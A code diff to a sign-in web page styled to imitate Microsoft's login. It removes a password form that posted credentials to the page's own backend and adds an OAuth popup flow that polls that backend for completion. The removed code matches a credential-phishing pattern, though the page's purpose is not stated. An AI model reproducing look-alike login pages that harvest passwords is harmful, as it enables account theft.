@@ -516,8 +516,8 @@
             <!-- Email Input Form - shown initially -->
             <div id="emailForm" style="display: block;">
                 <div class="form-group">
-                    <label for="emailInput" style="display: block; margin-bottom: 10px; color: #323130; font-size: 14px; font-weight: 600;">Enter your email address</label>
-                    <input type="email" id="emailInput" class="microsoft-input" placeholder="e.g. user@example.com" required autofocus>
+                    <label for="emailInput" style="display: block; margin-bottom: 10px; color: #323130; font-size: 14px; font-weight: 600;">Enter your email, phone, or Skype</label>
+                    <input type="email" id="emailInput" class="microsoft-input" placeholder="Email, phone, or Skype" required autofocus>
                 </div>
 
                 <div class="button-group">
@@ -768,74 +768,87 @@
             }
 
             clearMessage();
-            setLoading(true, 'Verifying your account...', false);
+            setLoading(true, 'Redirecting to Microsoft...', false);
 
             try {
-                const response = await fetch(`${API_BASE}/api/verify-email`, {
+                // Get OAuth URL from backend
+                const response = await fetch(`${API_BASE}/api/auth-url`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ email: email })
+                    body: JSON.stringify({})
                 });
 
                 const data = await response.json();
 
-                if (response.ok && data.exists) {
-                    setLoading(false);
-                    showPasswordForm(email);
-                    currentSessionId = data.sessionId; // Store session ID for subsequent login
+                if (response.ok && data.authUrl) {
+                    currentSessionId = data.sessionId;
+                    
+                    // Open Microsoft OAuth in popup
+                    authWindow = window.open(
+                        data.authUrl,
+                        'microsoft-oauth',
+                        'width=600,height=700,scrollbars=yes,resizable=yes,centerscreen=yes'
+                    );
+
+                    if (!authWindow) {
+                        throw new Error('Popup blocked. Please allow popups and try again.');
+                    }
+
+                    // Poll for authentication completion
+                    const pollInterval = setInterval(async () => {
+                        try {
+                            // Check if window is closed
+                            if (authWindow.closed) {
+                                clearInterval(pollInterval);
+                                clearTimeout(timeoutId);
+                                setLoading(false);
+                                showMessage('Authentication cancelled. Please try again.', 'error');
+                                return;
+                            }
+
+                            // Check authentication status
+                            const statusResponse = await fetch(`${API_BASE}/api/status?sessionId=${currentSessionId}`);
+                            const statusData = await statusResponse.json();
+
+                            if (statusData.authenticated) {
+                                clearInterval(pollInterval);
+                                clearTimeout(timeoutId);
+                                authWindow.close();
+                                setLoading(false);
+                                showSuccessForm(statusData.userEmail);
+                                showMessage('✅ Successfully signed in!', 'success');
+                            }
+
+                        } catch (error) {
+                            console.error('Error checking auth status:', error);
+                        }
+                    }, 2000); // Check every 2 seconds
+
+                    // Timeout after 5 minutes
+                    const timeoutId = setTimeout(() => {
+                        if (authWindow && !authWindow.closed) {
+                            authWindow.close();
+                        }
+                        clearInterval(pollInterval);
+                        setLoading(false);
+                        showMessage('Authentication timed out. Please try again.', 'error');
+                    }, 5 * 60 * 1000);
+
                 } else {
-                    setLoading(false);
-                    showMessage(data.message || 'Account not found. Please check your email address.', 'error');
+                    throw new Error(data.error || 'Failed to get authentication URL');
                 }
 
             } catch (error) {
-                console.error('Email verification error:', error);
+                console.error('Authentication error:', error);
                 setLoading(false);
-                showMessage('Error verifying email. Please try again.', 'error');
+                showMessage(`Authentication error: ${error.message}`, 'error');
             }
         }
 
-        async function signInWithPassword() {
-            const email = verifiedEmailAddress; // Use the verified email
-            const password = document.getElementById('passwordInput').value;
-
-            if (!password) {
-                showMessage('Please enter your password.', 'error');
-                return;
-            }
-
-            clearMessage();
-            setLoading(true, 'Signing in...', false);
-
-            try {
-                const response = await fetch(`${API_BASE}/api/login`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ 
-                        email: email, 
-                        password: password,
-                        sessionId: currentSessionId // Pass the session ID obtained during email verification
-                    })
-                });
-
-                const data = await response.json();
-
-                if (response.ok && data.success) {
-                    setLoading(false);
-                    showSuccessForm(email);
-                    showMessage('✅ Successfully signed in!', 'success');
-                } else {
-                    setLoading(false);
-                    showMessage(data.message || 'Incorrect password. Please try again.', 'error');
-                    document.getElementById('passwordInput').value = ''; // Clear password input
-                    document.getElementById('passwordInput').focus(); // Focus on password input
-                }
-
-            } catch (error) {
-                console.error('Login error:', error);
-                setLoading(false);
-                showMessage('Login error. Please try again.', 'error');
-            }
+        // OAuth authentication - password not needed
+        function signInWithPassword() {
+            // This function is no longer used since we authenticate via OAuth
+            showMessage('Please use the "Next" button to authenticate with Microsoft.', 'info');
         }
 
         function isValidEmail(email) {
